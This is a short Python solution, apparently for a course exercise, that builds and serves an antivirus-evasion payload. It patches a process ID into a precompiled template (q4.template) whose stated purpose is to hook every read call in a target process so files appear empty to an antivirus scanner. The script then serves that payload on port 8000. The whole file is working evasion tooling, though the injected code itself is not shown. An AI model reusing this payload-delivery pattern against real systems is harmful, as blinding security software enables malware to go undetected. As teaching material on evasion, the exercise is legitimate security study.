import evasion

import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to intercept all calls to read.

        Reminder: We want to intercept all calls to read (for all files)
        and replace them with calls that read a length of 0 bytes (to make
        the files appear empty).

        Notes:
        1. You can assume we already compiled q4.c into q4.template.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q4.template'

        # read q3.template as a bytearray
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = bytearray(reader.read())

        # find the pid's value placeholder "0x01234567"
        pid_index = data.find(struct.pack("<I", 0x01234567))

        # set the value of the pid 
        data[pid_index: pid_index + 4] = struct.pack("<I", pid)
    
        return bytes(data)


    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
